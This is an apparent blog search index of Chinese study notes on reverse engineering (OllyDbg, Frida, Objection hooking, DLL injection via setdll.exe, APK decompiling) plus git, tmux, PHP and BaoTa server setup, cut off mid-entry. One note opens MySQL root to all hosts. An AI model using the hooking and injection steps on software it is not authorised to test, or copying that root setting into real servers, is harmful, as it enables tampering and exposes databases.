<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>逆向工具</title>
      <link href="/2022/05/15/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/05/15/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>PC 逆向工具及使用<br>OD <a href="https://www.ollydbg.de/" target="_blank" rel="noopener">https://www.ollydbg.de/</a><br>ec <a href="https://www.cheatengine.org/" target="_blank" rel="noopener">https://www.cheatengine.org/</a></p><p>CFF Explorer <a href="https://download.cnet.com/CFF-Explorer/3000-2383_4-10431156.html" target="_blank" rel="noopener">https://download.cnet.com/CFF-Explorer/3000-2383_4-10431156.html</a></p><p>DLL 搜索顺序<br>1、程序所在目录<br>2、当前目录<br>3、系统目录 C:\windows\system32<br>4、Windows目录 C:\windows<br>5、PATH环境变量的各个目录</p><p>微软封印的技术<br>1、系统目录 C:\windows\system32<br>2、程序所在目录<br>3、当前目录<br>4、Windows目录 C:\windows<br>5、PATH环境变量的各个目录</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>x86/x64逆向分析</title>
      <link href="/2022/05/12/x86-x64%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/12/x86-x64%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>汇编语言的两种主流语体： Intel、AT&amp;T</p><p>x64 RAX     64位寄存器<br>有16个通用寄存器  RCX RDX R8 R9   这四个寄存器存放函数参数<br>8个字节 每个字节8位</p><ul><li><p>x86 EAX   32位寄存器<br>有8个通用寄存器   4个字节 每个字节8位</p></li><li><p>16位 AX<br>AH 高8位  AL 低8位  2个字节，每个字节8位</p></li></ul><p>操作码 + 操作数 = 指令</p><p>lea 装载有效地址<br>lea rcx, addr</p><p>函数序言、函数尾声<br>x86<br>    序言:<br>        push ebp<br>        mov  ebp, esp<br>        sub  esp, 0CCh</p><pre><code>尾声:    move esp, ebp    pop  ebp</code></pre><p>逆向生长的堆栈<br>栈是内存，会存放临时变量会紧要的数据<br>PUSH 减法操作<br>POP 加法操作<br>栈顶：RSP(x64) / ESP(x86)<br>栈底：EBP</p><p>堆 低地址<br>栈 高地址</p><p>EIP 寄存器 存储CPU即将要执行的指令</p><p>HEX，Hexadecimal ，十六进制。<br>DEC，Decimal ，十进制。<br>OCT，Octal ，八进制。<br>BIN，Binary ，二进制。</p><p>栈的噪音<br>CALL等价于：PUSH + JMP<br>RET 等价于：POP + JMP</p><p>内存<br>dd dc du</p><p>汇编指令<br>mov eax, [0x5]   ==&gt;&gt; eax = *((int *)0x5)</p><p>JE 如果上次比较 A = B 就跳<br>JMP 无条件跳转<br>push 5      —–&gt;      esp -= 4(32位设备)  *((int *) esp) = 5<br>push eax    —–&gt;      esp -= 4(32位设备)  *(int *) esp) = eax<br>pop  eax    —–&gt;      esp += 4(32位设备)  eax = *((int *) esp)<br>call 地址    —–&gt;      push eip(call的下一条指令); jmp 地址<br>ret         —–&gt;      pop eip</p><p>Intel CPU 的四个特权级<br>1、Ring 0   内核层、驱动层<br>2、Ring 1   未使用<br>3、Ring 2   未使用<br>4、Ring 3   用户层</p><p>更高层次的对抗<br>编写驱动程序</p><p>字节码<br>新跳转指令中的数据 = 跳转的地址 - 原地址 - 跳转指令的长度</p><p>IAT 导入地址表</p><p>DLL 远程调试<br>1、setdll.exe 放到要注入的exe下，之后以管理员的权限打开cmd<br>2、执行注入要执行的exe setdll.exe /d:xxx.dll xxx.exe<br>3、visual studio 打开dll项目<br>    设置为启动项，右键项目-属性-调试-远程命令-输入要注入的exe的绝对路径-调试器类型-混合-常规-输出目录-跟要注入的exe同个目录</p><p>调试工具</p><p>微软官网<br>DebugView<br>windbg</p><p>OD<br>ctrl+A 分析<br>esc 跳到定义处时返回用此按键<br>Alt + 退格键 撤销所选部分的修改<br>Ctrl+G 转到某个地址</p><p>eax 函数返回值</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>frida</title>
      <link href="/2022/05/11/frida/"/>
      <url>/2022/05/11/frida/</url>
      
        <content type="html"><![CDATA[<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><ul><li>Java.available    // 判断程序是否已经在Java VM 加载</li></ul><h2 id="终端命令"><a href="#终端命令" class="headerlink" title="终端命令"></a>终端命令</h2><ul><li><p>frida -U -l hook.js 包名      // 对某个应用执行 hook.js 里面的代码</p></li><li><p>frida -U -l hook.js 包名 tee -ai log      // tee -ai log 将输出存档到当前目录的 log 文件下</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>objection初探</title>
      <link href="/2022/05/10/objection%E5%88%9D%E6%8E%A2/"/>
      <url>/2022/05/10/objection%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<ul><li><p>注入应用后进入交互界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objection -g packageName explore</span><br></pre></td></tr></table></figure></li><li><p>查看内存中加载的库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ memory list modules</span><br></pre></td></tr></table></figure></li><li><p>查看库的导出函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ memory list exports libssl.so</span><br></pre></td></tr></table></figure></li><li><p>将结果保存到json文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ memory list exports libart.so --json &#x2F;path&#x2F;libart.json</span><br></pre></td></tr></table></figure></li><li><p>搜索整个内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ memory search --string --offsets-only</span><br></pre></td></tr></table></figure></li><li><p>提取整个或部分内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ memory dump all from_base</span><br></pre></td></tr></table></figure></li><li><p>启动Activity或Service</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ android intent launch_activity xxx</span><br></pre></td></tr></table></figure></li><li><p>查看当前可用Activity</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ android hooking list activities</span><br></pre></td></tr></table></figure></li><li><p>列出内存中所有的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ android hooking list classes</span><br></pre></td></tr></table></figure></li><li><p>列出所有包含关键词的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ android hooking search classes matchkey(关键词)</span><br></pre></td></tr></table></figure></li><li><p>列出内存中所有含有关键词的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ android hooking search methods matchkey(关键词)</span><br></pre></td></tr></table></figure></li><li><p>窥视某个类的所有方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ android hooking watch class android.bluetooth.BluetoothDevice</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kotlin</title>
      <link href="/2022/04/26/Kotlin/"/>
      <url>/2022/04/26/Kotlin/</url>
      
        <content type="html"><![CDATA[<p>问号? 表示可为空</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tmux</title>
      <link href="/2022/04/24/tmux/"/>
      <url>/2022/04/24/tmux/</url>
      
        <content type="html"><![CDATA[<h4 id="tmux-terminal-multiplexer-终端复用器"><a href="#tmux-terminal-multiplexer-终端复用器" class="headerlink" title="tmux (terminal multiplexer,终端复用器)"></a>tmux (terminal multiplexer,终端复用器)</h4><ul><li><p>启动新tmux窗口命令<br>tmux<br>或 tmux new -s ck (-s 表示 session会话，新窗口名字 ck)</p></li><li><p>在tmux窗口下再新建窗口<br>先按 ctrl(control) + b<br>再按 c</p></li><li><p>退出当前窗口<br>先按 ctrl(control) + b<br>再输入 exit</p></li><li><p>Ctrl(control)+b s：列出所有会话（所有窗口）</p></li><li><p>Ctrl(control)+b w: 列出当前tmux窗口的 所有会话</p></li><li><p>tmux ls 列出当前所有tmux窗口</p></li><li><p>tmux select-window -t <window-number> 切换窗口</p></li><li><p>tmux a 进入第一个tmux窗口</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>aapt一些命令</title>
      <link href="/2022/04/19/aapt%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/04/19/aapt%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<ul><li>查看应用包名和Activity<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aapt dump badging apk路径</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓逆向二</title>
      <link href="/2022/04/13/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%BA%8C/"/>
      <url>/2022/04/13/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h3><h4 id="java开发环境"><a href="#java开发环境" class="headerlink" title="java开发环境"></a>java开发环境</h4><ul><li>JDK — java开发环境集 (Java Development Kit)</li><li>JRE — 运行所需环境 (Java Runtime Environment，可以让电脑执行Java应用程序。JRE内部有一个Java虚拟机，JVM，以及一些标准库)</li></ul><h4 id="Android所需环境"><a href="#Android所需环境" class="headerlink" title="Android所需环境"></a>Android所需环境</h4><ul><li>SDK —（Software Development Kit）软件开发工具包</li><li>NDK — Native Development Kit 用来给安卓手机开发游戏用的，用于java和c++的接口交互</li></ul><h3 id="apk-文件结构"><a href="#apk-文件结构" class="headerlink" title="apk 文件结构"></a>apk 文件结构</h3><ul><li>将apk后缀改成zip后缀，可查看文件结构</li><li>assets: 不需要通过AAPT编译的静态资源</li><li>lib: 存放 .so 文件，该文件夹下有时会多一个层级，这是根据不同CPU型号而划分的，如 ARM，ARM-v7a，x86等</li><li>META-INF: 签名文件夹</li><li>dex: 存放代码和可执行文件</li><li>AndroidManifest.xml: 配置清单文件</li><li>resources.arsc: 资源索引表</li><li>res: 需要通过AAPT编译的资源，在资源索引表中会生产索引</li></ul><h3 id="apk-安装流程"><a href="#apk-安装流程" class="headerlink" title="apk 安装流程"></a>apk 安装流程</h3><h4 id="几个重要目录"><a href="#几个重要目录" class="headerlink" title="几个重要目录"></a>几个重要目录</h4><ul><li>system/app 系统自带的应用程序，获得adb root 权限才能删除</li><li>data/app  用户程序安装目录，安装时把apk文件复制到此目录，此apk可以导出直接重新安装</li><li>data/data 存放应用程序的数据</li><li>data/dalvik-cache     将apk中的dex文件安装到dalvik-cache目录下（dex文件是dalvik虚拟机的可执行文件，其大小约为原始apk的四分之一）</li><li>data/system/packages.xml  里面会有对应的apk的信息</li></ul><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><ul><li>复制apk安装包到/data/app目录下，解压并扫描安装包，把dex文件（Dalvik字节码）保存到dalvik-cache目录，并在/data/data目录下创建对应的应用数据</li></ul><h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h4><ul><li>删除安装过程中在上述三个目录的建的文件</li></ul><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><h4 id="java-虚拟机-JVM"><a href="#java-虚拟机-JVM" class="headerlink" title="java 虚拟机 JVM"></a>java 虚拟机 JVM</h4><ul><li>java字节码，基于栈结构</li></ul><h4 id="dalvik虚拟机"><a href="#dalvik虚拟机" class="headerlink" title="dalvik虚拟机"></a>dalvik虚拟机</h4><ul><li>jit机制</li><li>Android 5.0以下（不含5.0）</li><li>dalvik可执行文件体积更小，基于寄存器架构</li><li><font color=red>.dex =&gt; dexopt =&gt; .odex dalvik加载执行的是 odex文件，位于 /system/bin/dexopt </font></li><li>/system/bin/dexopt</li></ul><h4 id="art虚拟机"><a href="#art虚拟机" class="headerlink" title="art虚拟机"></a>art虚拟机</h4><ul><li>aot机制</li><li>Android5.0以上（含5.0）</li><li><font color=red>.dex =&gt; dex2oat =&gt; .oat art 加载执行的是oat文件，dex2oat 位于 /system/bin/dex2oat</font></li><li>系统启动流程：/system/app ==&gt; /data/app ==&gt; /system/framework</li></ul><h3 id="dalvik字节码类型"><a href="#dalvik字节码类型" class="headerlink" title="dalvik字节码类型"></a>dalvik字节码类型</h3><p>![image-20200506105406084](/Users/chenk/Library/Application Support/typora-user-images/image-20200506105406084.png)</p><p>![image-20200506105754425](/Users/chenk/Library/Application Support/typora-user-images/image-20200506105754425.png)</p><p>###![image-20200506104145925](/Users/chenk/Library/Application Support/typora-user-images/image-20200506104145925.png) </p><h3 id="dalvik-指令集"><a href="#dalvik-指令集" class="headerlink" title="dalvik 指令集"></a>dalvik 指令集</h3><ul><li><p>格式</p><p>基础字节码 - 名称后缀/字节码后缀 目的寄存器 源寄存器</p><p>名称后缀是 wide，表示数据宽度为64位</p><p>字节码后缀是 from16，表示源寄存器为16位</p></li><li><p>例子</p><p>move-wide/from16 vAA, vBBBB</p><p>move 为基础字节码，即opcode</p><p>wide为名称后缀，标识指令操作的数据宽度是64位</p><p>from16为字节码后缀，标识源为一个16位的寄存器引用变量</p><p>vAA为目的寄存器，它始终在源前面，取值范围 v0～v255（2的8次方？？）</p><p>vBBBB为源寄存器，取值范围为 v0～v65535（2的16次方？？？）</p></li><li><p>说明</p><p>dalvik指令大多数指令都用到了寄存器作为目的的操作数或源操作数，即把寄存器作为一个容器，用来存放东西。其中 A/B/C/D/E/F/G/H 代表一个4位的数，AA/BB/CC/DD… 代表一个8位的数，AAAA/BBBB… 代表一个64位的数</p></li><li><p>13种dalvik指令</p><ul><li><p>空操作指令</p><ul><li>nop，值为00，通常用于代码对齐，无实际操作</li></ul></li><li><p>数据操作指令</p><ul><li><p>move</p><ul><li><p>有三个作用</p><p>1、进行赋值操作；</p><p>2、move-result 接收方法返回值；</p><p>3、处理异常的操作</p></li><li><p>例子</p><p>move-result-void 返回值为空</p><p>move-result vAA     返回32位的非对象值，寄存器是8位</p><p>move-result-object vAA    返回值为对象，寄存器是8位</p><p>move-exception vAA 将异常保存到寄存器vAA</p></li></ul></li></ul></li></ul></li></ul><ul><li><p>数据定义指令</p><ul><li>const</li></ul></li><li><p>数组</p><ul><li>array-length vA, vB     </li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓逆向一</title>
      <link href="/2022/04/13/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B8%80/"/>
      <url>/2022/04/13/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h3 id="apk打包流程"><a href="#apk打包流程" class="headerlink" title="apk打包流程"></a>apk打包流程</h3><h4 id="资源处理"><a href="#资源处理" class="headerlink" title="资源处理"></a>资源处理</h4><ul><li>aapt处理资源文件，分析AndroidMainifest.xml中的资源文件，生成R.java和resources.arsc文件，<br>aidl处理aidl文件，生成对应的java接口文件</li></ul><h4 id="代码编译"><a href="#代码编译" class="headerlink" title="代码编译"></a>代码编译</h4><ul><li>将上一过程产生的R.java和java接口文件、工程源代码文件，一起通过Java Compiler编译成.class文件，达成jar包（这里可以加入代码混淆）</li><li>与第三方的jar包一起通过dx工具转换成.dex文件</li><li>通过apkbuilder工具aapt生成的resources.arsc、上述的.dex文件、其他资源一起打包成未签名的apk</li></ul><h4 id="添加签名"><a href="#添加签名" class="headerlink" title="添加签名"></a>添加签名</h4><ul><li>通过Jarsigner对生成的未签名的apk进行签名</li><li>通过zipalign对签名后的apk进行处理，使apk中所有资源文件距离文件起始偏移为4字节的整倍数，目的是为了在通过内存映射访问apk文件时更快</li></ul><h3 id="APK反编译"><a href="#APK反编译" class="headerlink" title="APK反编译"></a>APK反编译</h3><ul><li>apktool: apktool d -s xx.apk 能得到 classes.dex 一般用这种方式来反编译apk </li><li>dex2jar: 将 dex 文件转化为 jar 文件</li><li>jd-gui: 将Jar包文件反编译成java源文件</li></ul><h3 id="查看-Android手机CPU类型"><a href="#查看-Android手机CPU类型" class="headerlink" title="查看 Android手机CPU类型"></a>查看 Android手机CPU类型</h3><p>adb shell getprop ro.product.cpu.abi</p><p>armeabiv-v7a(32位): 第7代及以上的 ARM 处理器。2011年5月以后的生产的大部分Android设备都使用它.<br>arm64-v8a(64位): 第8代、64位ARM处理器，现在已经是主流版本，三星 Galaxy S6是其中之一。<br>armeabi: 第5代、第6代的ARM处理器，早期的手机用的比较多。<br>x86: 平板、模拟器用得比较多。<br>x86_64: 64位的平板。</p><h3 id="谷歌大手机用这个指令发-frida-server-到手机"><a href="#谷歌大手机用这个指令发-frida-server-到手机" class="headerlink" title="谷歌大手机用这个指令发 frida-server 到手机"></a>谷歌大手机用这个指令发 frida-server 到手机</h3><p>adb push /Users/chenk/Documents/code/github_code/Android/tool/frida-server-15.1.20-android-arm /data/local/tmp/frida-server</p><h3 id="查看-CPU信息"><a href="#查看-CPU信息" class="headerlink" title="查看 CPU信息"></a>查看 CPU信息</h3><p>cat /proc/cpuinfo</p><h3 id="Brida"><a href="#Brida" class="headerlink" title="Brida"></a>Brida</h3><p>Brida是一个Burp的插件<br>Brida是一座连接Burp和Frida的桥<br>解决 加密、解密、Fuzz、Scan一条龙服务</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>git常用命令</title>
      <link href="/2022/04/12/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/04/12/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="克隆远程仓库"><a href="#克隆远程仓库" class="headerlink" title="克隆远程仓库"></a>克隆远程仓库</h2><ul><li>克隆master分支最新版本内容到本地<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --depth 1 xxx.git</span><br></pre></td></tr></table></figure></li></ul><h2 id="更新远程github库到本地"><a href="#更新远程github库到本地" class="headerlink" title="更新远程github库到本地"></a>更新远程github库到本地</h2><ul><li><p>1.查看是否有冲突</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br></pre></td></tr></table></figure></li><li><p>2.没冲突的话，直接到第三步，有冲突的话，想忽略本地的修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard origin/master</span><br></pre></td></tr></table></figure></li><li><p>2.1 不想忽略本地的修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add filename</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> commit -m <span class="string">"message"</span></span><br></pre></td></tr></table></figure></li><li><p>2.2 如果合并后觉得混乱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD</span><br></pre></td></tr></table></figure></li><li><p>3.想合并</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git stash   //备份当前的工作区的内容，从最近的一次提交中读取相关内容，让工作区保证和上次提交的内容一致。同时，将当前的工作区内容保存到Git栈中。</span><br><span class="line"></span><br><span class="line">$ git stash pop</span><br><span class="line"></span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure></li></ul><h2 id="上传本地的文件"><a href="#上传本地的文件" class="headerlink" title="上传本地的文件"></a>上传本地的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .</span><br><span class="line">$ git commit -m <span class="string">'something'</span></span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure><h2 id="上传大文件-超过100M的"><a href="#上传大文件-超过100M的" class="headerlink" title="上传大文件 超过100M的"></a>上传大文件 超过100M的</h2><p>1.安装 git-lfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ brew install git-lfs</span><br><span class="line"></span><br><span class="line">$ git lfs track “*.zip” --这里的 “ *.zip <span class="string">" 就是要上传的大文件的路径</span></span><br></pre></td></tr></table></figure><p>2.这行忘记为什么要加了,可以试试不加,有遇到再试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add .gitattributes</span><br></pre></td></tr></table></figure><p>3.添加所要上传的文件后提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add demo.gif</span><br><span class="line">$ git commit -m <span class="string">"xxx"</span></span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure><h2 id="查看某个文件本次改变情况"><a href="#查看某个文件本次改变情况" class="headerlink" title="查看某个文件本次改变情况"></a>查看某个文件本次改变情况</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> -p filename</span><br></pre></td></tr></table></figure><h2 id="查看当前分支信息"><a href="#查看当前分支信息" class="headerlink" title="查看当前分支信息"></a>查看当前分支信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git config --list</span><br></pre></td></tr></table></figure><h2 id="查看处于哪个分支"><a href="#查看处于哪个分支" class="headerlink" title="查看处于哪个分支"></a>查看处于哪个分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch</span><br></pre></td></tr></table></figure><h2 id="创建并切换到新分支"><a href="#创建并切换到新分支" class="headerlink" title="创建并切换到新分支"></a>创建并切换到新分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b xxx</span><br></pre></td></tr></table></figure><h2 id="查看远程仓库地址"><a href="#查看远程仓库地址" class="headerlink" title="查看远程仓库地址"></a>查看远程仓库地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br></pre></td></tr></table></figure><h2 id="撤销git-add"><a href="#撤销git-add" class="headerlink" title="撤销git add"></a>撤销git add</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rm --cached filename</span><br></pre></td></tr></table></figure><h2 id="如果撤销的是文件夹要加-r"><a href="#如果撤销的是文件夹要加-r" class="headerlink" title="如果撤销的是文件夹要加 -r"></a>如果撤销的是文件夹要加 -r</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rm -r --cached floder</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mac-php开发环境</title>
      <link href="/2020/10/27/mac-php%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/10/27/mac-php%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="开启Apache服务"><a href="#开启Apache服务" class="headerlink" title="开启Apache服务"></a>开启Apache服务</h2><h3 id="mac有自带apache和php-直接打开命令行即可"><a href="#mac有自带apache和php-直接打开命令行即可" class="headerlink" title="mac有自带apache和php 直接打开命令行即可"></a>mac有自带apache和php 直接打开命令行即可</h3><ul><li><p>首先切换到root用户 sudo -i</p></li><li><p>接着查看80端口是否被暂用 lsof</p></li><li><p>查看apache 版本  httpd -v</p></li><li><p>开启apache     apachectl start</p></li><li><p>重启apache  apachectl restart</p></li><li><p>关闭apache  apachectl stop</p></li><li><p>运行 127.0.0.1,显示it works表示apache开启成功</p></li></ul><h2 id="开启php"><a href="#开启php" class="headerlink" title="开启php"></a>开启php</h2><h3 id="进入路径-etc-apache2-开启apache配置文件httpd-conf-开启php模块"><a href="#进入路径-etc-apache2-开启apache配置文件httpd-conf-开启php模块" class="headerlink" title="进入路径/etc/apache2 开启apache配置文件httpd.conf 开启php模块"></a>进入路径/etc/apache2 开启apache配置文件httpd.conf 开启php模块</h3><ul><li>找到类似这行，然后把注释去掉 LoadModule php7_module libexec/apache2/libphp7.so  </li></ul><h2 id="在-etc-apache2-httpd-conf-查看网站服务器根目录"><a href="#在-etc-apache2-httpd-conf-查看网站服务器根目录" class="headerlink" title="在 /etc/apache2/httpd.conf 查看网站服务器根目录"></a>在 /etc/apache2/httpd.conf 查看网站服务器根目录</h2><h3 id="查找-DocumentRoot，能看到网站跟目录"><a href="#查找-DocumentRoot，能看到网站跟目录" class="headerlink" title="查找  DocumentRoot，能看到网站跟目录"></a>查找  DocumentRoot，能看到网站跟目录</h3><h2 id="重启Apache服务器，在网站服务器根目录，写个test-php"><a href="#重启Apache服务器，在网站服务器根目录，写个test-php" class="headerlink" title="重启Apache服务器，在网站服务器根目录，写个test.php"></a>重启Apache服务器，在网站服务器根目录，写个test.php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &#39;hello xym:this mac default apache !!! 2018.6.21!!&#39;;</span><br><span class="line">    phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>到浏览器执行 127.0.0.1/test.php，能显示php的相关信息，就是正常的</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android-Killer</title>
      <link href="/2020/09/08/Android-Killer/"/>
      <url>/2020/09/08/Android-Killer/</url>
      
        <content type="html"><![CDATA[<h2 id="解包分析时，APKTOOL管理器选择默认的"><a href="#解包分析时，APKTOOL管理器选择默认的" class="headerlink" title="解包分析时，APKTOOL管理器选择默认的"></a>解包分析时，APKTOOL管理器选择默认的</h2><h2 id="重新编译时，APKTOOL管理器选择2-4-1的"><a href="#重新编译时，APKTOOL管理器选择2-4-1的" class="headerlink" title="重新编译时，APKTOOL管理器选择2.4.1的"></a>重新编译时，APKTOOL管理器选择2.4.1的</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>宝塔</title>
      <link href="/2020/08/18/%E5%AE%9D%E5%A1%94/"/>
      <url>/2020/08/18/%E5%AE%9D%E5%A1%94/</url>
      
        <content type="html"><![CDATA[<p>数据库，远程访问不了</p><p>终端输入<br>mysql -uroot -p</p><p>输入密码后，以下命令是在mysql内完成，仍然是在终端<br>mysql&gt; use mysql;<br>mysql&gt; select user, Host from user;<br>+————+————+<br>| user       | Host       |<br>+————+————+<br>| xxxxxxxxxx | %          |<br>| numbers    | %          |<br>| root       | 127.0.0.1  |<br>|            | 4z-k20-a35 |<br>| root       | 4z-k20-a35 |<br>| root       | ::1        |<br>|            | localhost  |<br>| xxxxxxxxxx | localhost  |<br>| numbers    | localhost  |<br>| root       | localhost  |<br>+————+————+<br>注意这里 root 只允许本地连接，最高权限的root用户只允许本地连接，所以其他用户也就只允许本地连接，<br>所以需要把root修改为允许所有连接，接着执行<br>mysql&gt; UPDATE user SET Host = ‘%’ WHERE User = ‘root’ AND Host=’localhost’;<br>mysql&gt; FLUSH PRIVILEGES;     – 使修改生效</p><h2 id="伪静态配置"><a href="#伪静态配置" class="headerlink" title="伪静态配置"></a>伪静态配置</h2><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>if (!-d $request_filename){<br>    set $rule_0 1$rule_0;<br>}<br>if (!-f $request_filename){<br>    set $rule_0 2$rule_0;<br>}<br>if ($rule_0 = “21”){<br>    rewrite ^/(.*)$ /index.php?s=/$1 last;<br>}</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><IfModule mod_rewrite.c> RewriteEngine on RewriteBase / RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.*)$ index.php?s=/$1 [QSA,PT,L]</IfModule><p>导入源码后，要对站点进行设置<br>子目录绑定 public<br>网站目录-运行目录，选择 /public</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlite3操作</title>
      <link href="/2020/08/13/sqlite3%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/08/13/sqlite3%E6%93%8D%E4%BD%9C/</url>
      
